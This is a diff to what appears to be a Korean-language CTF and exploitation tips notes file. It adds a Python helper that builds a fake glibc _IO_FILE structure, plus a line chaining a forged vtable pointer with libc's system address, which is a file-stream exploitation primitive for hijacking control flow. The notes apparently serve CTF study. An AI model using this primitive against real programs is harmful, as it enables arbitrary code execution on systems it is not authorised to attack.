@@ -249,6 +249,51 @@ ifind('call') : 호출되는 함수볼 수 있음
 
 <br />
 
+> File Struct
+
+```python
+def pack_file(_flags = 0,
+		_IO_read_ptr = 0,
+		_IO_read_end = 0,
+		_IO_read_base = 0,
+		_IO_write_base = 0,
+		_IO_write_ptr = 0,
+		_IO_write_end = 0,
+		_IO_buf_base = 0,
+		_IO_buf_end = 0,
+		_IO_save_base = 0,
+		_IO_backup_base = 0,
+		_IO_save_end = 0,
+		_IO_marker = 0,
+		_IO_chain = 0,
+		_fileno = 0,
+		_lock = 0):
+	struct = p32(_flags) + \
+	     p32(0) + \
+	     p64(_IO_read_ptr) + \
+	     p64(_IO_read_end) + \
+	     p64(_IO_read_base) + \
+	     p64(_IO_write_base) + \
+	     p64(_IO_write_ptr) + \
+	     p64(_IO_write_end) + \
+	     p64(_IO_buf_base) + \
+	     p64(_IO_buf_end) + \
+	     p64(_IO_save_base) + \
+	     p64(_IO_backup_base) + \
+	     p64(_IO_save_end) + \
+	     p64(_IO_marker) + \
+	     p64(_IO_chain) + \
+	     p32(_fileno)
+	struct = struct.ljust(0x88, '\0')
+	struct += p64(_lock)
+	struct = struct.ljust(0xd8, '\0')
+	return struct
+
+pack_file() + p64(vtable) + libc.symbols['system']
+```
+
+<br />
+
 # Web Tips
 
 > Use python requests
